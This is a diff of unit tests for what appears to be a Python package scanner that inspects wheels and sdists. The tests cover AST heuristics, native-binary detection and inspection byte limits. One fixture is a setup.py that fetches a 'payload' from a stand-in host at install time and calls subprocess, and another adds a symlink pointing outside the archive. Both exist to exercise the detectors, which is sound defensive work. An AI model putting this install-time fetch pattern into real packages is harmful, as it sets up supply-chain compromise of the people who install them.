@@ -10,10 +10,15 @@ from collections.abc import Mapping
 from unittest.mock import Mock, patch
 
 from trustcheck.artifacts import (
+    MAX_DEEP_INSPECTION_BYTES,
     MAX_METADATA_BYTES,
+    MAX_NATIVE_ANALYSIS_BYTES,
+    MAX_SOURCE_AST_BYTES,
     OVERSIZED_FILE_BYTES,
     _canonical_requirements,
+    _inspect_tar_payloads,
     _inspect_wheel_contents,
+    _inspect_zip_payloads,
     _inspect_zip_structure,
     _read_tar_member,
     _record_sdist_file_findings,
@@ -103,6 +108,52 @@ def build_sdist(
 
 
 class WheelArtifactInspectionTests(unittest.TestCase):
+    def test_ast_and_native_heuristics_are_recorded_in_artifact_results(self) -> None:
+        payload = build_wheel(
+            extra_files={
+                "demo/setup.py": (
+                    b"import requests, subprocess\n"
+                    b"requests.get('https://example.invalid/payload')\n"
+                    b"subprocess.run(['python', '-c', 'pass'])\n"
+                ),
+                "demo/extra.pyd": b"MZ",
+            }
+        )
+
+        result = inspect_artifact(
+            "demo-1.0.0-py3-none-any.whl",
+            payload,
+            expected_project="demo",
+            expected_version="1.0.0",
+        )
+        codes = {finding.code for finding in result.heuristic_findings}
+
+        self.assertEqual(result.source_files_analyzed, 2)
+        self.assertIn("ast_network_call", codes)
+        self.assertIn("ast_subprocess_call", codes)
+        self.assertIn("ast_install_time_execution_chain", codes)
+        self.assertEqual(result.native_binaries[0].format, "PE")
+        self.assertIn("unable to parse", result.native_binaries[0].parse_error or "")
+
+    def test_ast_limits_and_parse_errors_do_not_invalidate_archive(self) -> None:
+        payload = build_wheel(
+            extra_files={
+                "demo/invalid.py": b"\xff",
+                "demo/oversized.py": b"x" * (MAX_METADATA_BYTES + 1),
+            }
+        )
+
+        result = inspect_artifact(
+            "demo-1.0.0-py3-none-any.whl",
+            payload,
+            expected_project="demo",
+            expected_version="1.0.0",
+        )
+
+        self.assertTrue(result.archive_valid)
+        self.assertIn("not valid UTF-8", "\n".join(result.source_parse_errors))
+        self.assertIn("AST limit", "\n".join(result.source_parse_errors))
+
     def test_valid_wheel_record_console_scripts_and_top_level_files(self) -> None:
         payload = build_wheel(
             entry_points="[console_scripts]\nDemo-Tool = demo.cli:main\n",
@@ -468,6 +519,55 @@ class WheelArtifactInspectionTests(unittest.TestCase):
         self.assertIn("appears more than once", "\n".join(result.record_errors))
         self.assertIn("cannot be validated safely", "\n".join(result.record_errors))
 
+    def test_deep_inspection_limits_skip_unsafe_or_oversized_members(self) -> None:
+        encrypted = zipfile.ZipInfo("demo/encrypted.py")
+        encrypted.flag_bits = 0x1
+        source_budget = zipfile.ZipInfo("demo/budget.py")
+        source_budget.file_size = 2
+        native_oversized = zipfile.ZipInfo("demo/oversized.pyd")
+        native_oversized.file_size = MAX_NATIVE_ANALYSIS_BYTES + 1
+        native_budget = zipfile.ZipInfo("demo/budget.pyd")
+        native_budget.file_size = 2
+        zip_result = ArtifactInspection(inspected=True, kind="wheel")
+        with patch("trustcheck.artifacts.MAX_DEEP_INSPECTION_BYTES", 1):
+            _inspect_zip_payloads(
+                Mock(),
+                [encrypted, source_budget, native_oversized, native_budget],
+                zip_result,
+            )
+
+        directory = tarfile.TarInfo("demo/")
+        directory.type = tarfile.DIRTYPE
+        source_oversized = tarfile.TarInfo("demo/oversized.py")
+        source_oversized.size = MAX_SOURCE_AST_BYTES + 1
+        tar_source_budget = tarfile.TarInfo("demo/budget.py")
+        tar_source_budget.size = 2
+        tar_native_oversized = tarfile.TarInfo("demo/oversized.so")
+        tar_native_oversized.size = MAX_NATIVE_ANALYSIS_BYTES + 1
+        tar_native_budget = tarfile.TarInfo("demo/budget.so")
+        tar_native_budget.size = 2
+        tar_result = ArtifactInspection(inspected=True, kind="sdist")
+        with patch("trustcheck.artifacts.MAX_DEEP_INSPECTION_BYTES", 1):
+            _inspect_tar_payloads(
+                Mock(),
+                [
+                    directory,
+                    source_oversized,
+                    tar_source_budget,
+                    tar_native_oversized,
+                    tar_native_budget,
+                ],
+                tar_result,
+            )
+
+        self.assertIn("byte budget exhausted", "\n".join(zip_result.source_parse_errors))
+        self.assertIn("native binary exceeds", "\n".join(zip_result.source_parse_errors))
+        tar_errors = "\n".join(tar_result.source_parse_errors)
+        self.assertIn("AST limit", tar_errors)
+        self.assertIn("native binary exceeds", tar_errors)
+        self.assertIn("byte budget exhausted", tar_errors)
+        self.assertEqual(MAX_DEEP_INSPECTION_BYTES, 64 * 1024 * 1024)
+
     def test_missing_root_is_purelib_is_reported(self) -> None:
         result = inspect_artifact(
             "demo-1.0.0-py3-none-any.whl",
@@ -571,6 +671,10 @@ class SdistArtifactInspectionTests(unittest.TestCase):
             script_info.size = len(script)
             script_info.mode = 0o755
             archive.addfile(script_info, io.BytesIO(script))
+            native = b"MZ"
+            native_info = tarfile.TarInfo("demo-1.0.0/native.pyd")
+            native_info.size = len(native)
+            archive.addfile(native_info, io.BytesIO(native))
             link_info = tarfile.TarInfo("demo-1.0.0/current")
             link_info.type = tarfile.SYMTYPE
             link_info.linkname = "../outside"
@@ -588,6 +692,7 @@ class SdistArtifactInspectionTests(unittest.TestCase):
             result.unusual_files,
         )
         self.assertIn("dynamic execution", "\n".join(result.suspicious_files))
+        self.assertEqual(result.native_binaries[0].format, "PE")
         self.assertIn(
             "artifact package metadata does not declare Name",
             result.metadata_mismatches,
